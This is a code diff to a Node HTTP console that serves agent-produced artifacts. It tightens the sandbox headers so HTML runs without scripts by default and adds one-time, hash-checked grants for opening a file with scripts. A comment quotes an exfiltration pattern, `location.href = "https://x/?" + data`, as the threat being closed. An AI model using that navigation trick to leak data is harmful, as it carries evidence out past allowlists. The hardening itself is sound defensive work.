@@ -2,8 +2,9 @@
  * HTTP app for the swarm web UI: JSON API + SSE + static bundle.
  * node:http only, so `node --experimental-strip-types` runs it with zero deps.
  */
-import { timingSafeEqual } from "node:crypto";
-import { createReadStream, existsSync } from "node:fs";
+import { createHash, randomBytes, timingSafeEqual } from "node:crypto";
+import { existsSync } from "node:fs";
+import { pipeline } from "node:stream";
 import { execFile } from "node:child_process";
 import { readFile, realpath, stat } from "node:fs/promises";
 import { createServer, type IncomingMessage, type Server, type ServerResponse } from "node:http";
@@ -24,7 +25,9 @@ import { deleteGoal, GoalError, listGoals, readGoal, saveGoal } from "./goals.ts
 import { listLibrary, readLibraryEntry } from "./library.ts";
 import { describeRoots, InputsError, listInputSets, parseInputsRoots, resolveInputImage, resolveInputSet, RootStore } from "./inputs.ts";
 import { countForgedTools, findRun, listSwarmRows, listWorkFiles, queryTraces, readAllPosts, readSwarmView, readTimedPosts, resolveToolOutputFile, resolveWorkFile } from "./model.ts";
+import { userInfo } from "node:os";
 import { hashArtifacts } from "../artifacts.ts";
+import { hashRegularFile, openRegular } from "../regular-file.ts";
 import { buildDossier } from "../dossier.ts";
 import { renderReport } from "../report.ts";
 import { summarize } from "../summary.ts";
@@ -68,6 +71,8 @@ export type UiAppOptions = {
   heartbeatMs?: number;
   /** How long a finish-line result stands whatever happens on disk; tests shorten it. */
   checksTtlMs?: number;
+  /** How long a grant to open one HTML artifact with its scripts stays good; tests shorten it. */
+  scriptGrantTtlMs?: number;
 };
 
 export type UiApp = {
@@ -168,14 +173,7 @@ async function readBody(req: IncomingMessage, limit = 64 * 1024): Promise<unknow
  * reader asking for a copy means. Two intentions, two answers, neither
  * guessed from the file extension.
  */
-async function sendFile(
-  res: ServerResponse,
-  abs: string,
-  extraHeaders: Record<string, string> = {},
-  download = false,
-): Promise<void> {
-  const info = await stat(abs);
-  if (!info.isFile()) throw new HttpError(404, "not a file");
+function fileHeaders(abs: string, size: number, extraHeaders: Record<string, string>, download: boolean): Record<string, string> {
   const type = MIME[extname(abs).toLowerCase()] ?? "application/octet-stream";
   // Names under work/ come from evidence and can be in any script. Node
   // refuses a header value above U+00FF (and mangles some that pass), so the
@@ -184,20 +182,56 @@ async function sendFile(
   const name = basename(abs);
   const fallback = name.replace(/[^\x20-\x7e]|["\\]/g, "_");
   const encoded = encodeURIComponent(name).replace(/['()*]/g, (c) => `%${c.charCodeAt(0).toString(16).toUpperCase()}`);
-  res.writeHead(200, {
+  return {
     "content-type": type,
-    "content-length": String(info.size),
+    "content-length": String(size),
     "cache-control": "no-store",
     "content-disposition": `${download ? "attachment" : "inline"}; filename="${fallback}"; filename*=UTF-8''${encoded}`,
     ...extraHeaders,
-  });
-  // The headers are out, so a file removed or made unreadable since the stat
-  // can only cut the response short; without a listener the stream's error
-  // is an uncaught exception and takes the whole console down with it.
-  const stream = createReadStream(abs);
-  stream.on("error", () => res.destroy());
-  stream.pipe(res);
+  };
 }
+
+async function sendFile(
+  res: ServerResponse,
+  abs: string,
+  extraHeaders: Record<string, string> = {},
+  download = false,
+): Promise<void> {
+  // Opened once, as a regular file, and served from that handle: a stat
+  // then an open by name let a live VM swap a checked file for a FIFO in
+  // between, and the open would hold an I/O thread for good.
+  const opened = await openRegular(abs);
+  if ("why" in opened) throw new HttpError(404, opened.why === "missing" ? "no such file" : `not served: ${opened.why}`);
+  res.writeHead(200, fileHeaders(abs, opened.size, extraHeaders, download));
+  // The headers are out, so a read that fails now can only cut the response
+  // short; pipeline closes the handle whichever side ends first (a reader
+  // who goes away mid-download included), and its error is swallowed rather
+  // than taking the whole console down.
+  pipeline(opened.handle.createReadStream(), res, () => undefined);
+}
+
+/**
+ * An HTML artifact, as the console serves it: agent output, or evidence
+ * carved into an .html file. A sandbox without allow-same-origin is an
+ * opaque origin and connect-src 'none' stops fetch(), but neither stops a
+ * page from navigating itself: `location.href = "https://x/?" + data`, or a
+ * <meta http-equiv=refresh>, carried whatever the file held out of the
+ * examiner's own browser, past every allowlist the run had. So no scripts,
+ * and the sandbox directive's other flags (no automatic navigation, no
+ * forms, no popups) hold the rest.
+ */
+const ARTIFACT_CSP =
+  "sandbox; default-src 'none'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'";
+/**
+ * The same file with its scripts, once, on the operator's word and a grant
+ * (below): still an opaque origin with no fetch, no forms, no popups and no
+ * top-level navigation. Scripts can still navigate the frame itself, which
+ * is what the operator is warned of before asking.
+ */
+const ARTIFACT_SCRIPTS_CSP =
+  "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'";
+/** An artifact opened with scripts is read whole, so the bytes hashed are the bytes served; past this it is not offered. */
+const SCRIPTS_MAX_BYTES = 32 * 1024 * 1024;
 
 export function createUiApp(options: UiAppOptions): UiApp {
   const root = resolve(options.root);
@@ -227,6 +261,23 @@ export function createUiApp(options: UiAppOptions): UiApp {
     return promise;
   }
   const token = options.token ?? process.env.SWARM_UI_TOKEN ?? "";
+  /**
+   * One-time grants to open one HTML artifact with its scripts. The console
+   * asks for one over its authenticated channel after the operator confirms;
+   * it names the run, the path and the sha256 the file had then, is spent by
+   * the first request that presents it, and lapses in a minute. The artifact
+   * itself has no token and no scripts, so it cannot mint one; a missing,
+   * spent, lapsed or mismatched grant gets the no-script file.
+   */
+  const scriptGrantTtlMs = options.scriptGrantTtlMs ?? 60_000;
+  const scriptGrants = new Map<string, { run: string; rel: string; sha256: string; expires: number }>();
+  const osUser = (() => {
+    try {
+      return userInfo().username;
+    } catch {
+      return null;
+    }
+  })();
   const envRoots = parseInputsRoots(options.inputsRoot ?? process.env.SWARM_INPUTS_ROOT ?? "");
   const allowRuntimeRoots = options.allowRuntimeRoots ?? process.env.SWARM_INPUTS_ROOT_FROM_UI === "1";
   const rootStore = new RootStore(join(runsDir, "inputs-roots.json"));
@@ -653,7 +704,7 @@ export function createUiApp(options: UiAppOptions): UiApp {
             "content-type": "text/html; charset=utf-8",
             "content-length": String(Buffer.byteLength(html)),
             "content-security-policy":
-              "sandbox allow-scripts; default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'",
+              "sandbox; default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'",
             "x-content-type-options": "nosniff",
           });
           res.end(html);
@@ -746,19 +797,70 @@ export function createUiApp(options: UiAppOptions): UiApp {
         // outright and confirms what is left really lives under work/.
         const abs = await resolveWorkFile(sandbox, rel);
         if (typeof abs !== "string") throw new HttpError(abs.error, abs.message);
-        // Artifacts are agent output. sandbox without allow-same-origin is an
-        // opaque origin; connect-src 'none' stops fetch() even if a page had
-        // CORS. Scripts still run so HTML canvases stay interactive.
-        await sendFile(
-          res,
-          abs,
-          {
-            "content-security-policy":
-              "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'",
-            "x-content-type-options": "nosniff",
-          },
-          url.searchParams.get("download") === "1",
-        );
+        const download = url.searchParams.get("download") === "1";
+        const grantId = url.searchParams.get("scripts");
+        if (grantId && !download) {
+          // A grant is spent by being presented, whatever the answer, so it
+          // can be neither replayed nor probed.
+          const grant = scriptGrants.get(grantId);
+          scriptGrants.delete(grantId);
+          const opened = await openRegular(abs);
+          if ("why" in opened) throw new HttpError(404, opened.why === "missing" ? "no such file" : `not served: ${opened.why}`);
+          if (opened.size > SCRIPTS_MAX_BYTES) {
+            await opened.handle.close();
+            await sendFile(res, abs, { "content-security-policy": ARTIFACT_CSP, "x-content-type-options": "nosniff", "x-artifact-scripts": "off" });
+            return;
+          }
+          let bytes: Buffer;
+          try {
+            bytes = await opened.handle.readFile();
+          } finally {
+            await opened.handle.close();
+          }
+          // The bytes served are the bytes hashed: a file changed since the
+          // operator was shown its hash is served without its scripts.
+          const sha256 = createHash("sha256").update(bytes).digest("hex");
+          const scripted = Boolean(grant && grant.run === id && grant.rel === rel && grant.expires >= Date.now() && grant.sha256 === sha256);
+          if (scripted) {
+            // An operator's action, on the run's own trace: which file, which
+            // bytes, when (the line's ts), who, from where.
+            const action = { path: `work/${rel}`, sha256, via: "web", os_user: osUser, remote: req.socket.remoteAddress ?? null };
+            await appendEvent(sandbox, { agent: "operator", tool: "artifact_scripts", args: action, result: { ok: true, opened_with_scripts: true } }).catch((err) => {
+              console.error(`ui: operator opened ${action.path} (sha256 ${sha256}) with scripts at ${new Date().toISOString()}${osUser ? ` as ${osUser}` : ""}; the run's trace could not take the line: ${(err as Error).message}`);
+            });
+          }
+          res.writeHead(
+            200,
+            fileHeaders(abs, bytes.length, { "content-security-policy": scripted ? ARTIFACT_SCRIPTS_CSP : ARTIFACT_CSP, "x-content-type-options": "nosniff", "x-artifact-scripts": scripted ? "on" : "off" }, false),
+          );
+          res.end(bytes);
+          return;
+        }
+        await sendFile(res, abs, { "content-security-policy": ARTIFACT_CSP, "x-content-type-options": "nosniff" }, download);
+        return;
+      }
+      /**
+       * A one-time grant to open one HTML artifact with its scripts, asked
+       * for by the console after the operator confirmed the warning. Needs
+       * the token: the artifact, framed with no scripts and no token, cannot
+       * ask for its own.
+       */
+      case "work-scripts": {
+        if (method !== "POST") throw new HttpError(405, "method not allowed");
+        requireToken(req, url);
+        const body = (await readBody(req)) as { path?: unknown };
+        const rel = (typeof body.path === "string" ? body.path : "").replace(/^work\//, "");
+        if (!/\.html?$/i.test(rel)) throw new HttpError(400, "only an HTML artifact is opened with its scripts");
+        const abs = await resolveWorkFile(sandbox, rel);
+        if (typeof abs !== "string") throw new HttpError(abs.error, abs.message);
+        const hashed = await hashRegularFile(abs);
+        if (hashed === null || "why" in hashed) throw new HttpError(404, "no such file");
+        if (hashed.size > SCRIPTS_MAX_BYTES) throw new HttpError(413, `an artifact over ${SCRIPTS_MAX_BYTES} bytes is not opened with its scripts`);
+        const now = Date.now();
+        for (const [k, g] of scriptGrants) if (g.expires < now) scriptGrants.delete(k);
+        const grant = randomBytes(24).toString("base64url");
+        scriptGrants.set(grant, { run: id, rel, sha256: hashed.sha256, expires: now + scriptGrantTtlMs });
+        json(res, 200, { grant, path: `work/${rel}`, sha256: hashed.sha256, expires_in_ms: scriptGrantTtlMs });
         return;
       }
       /**
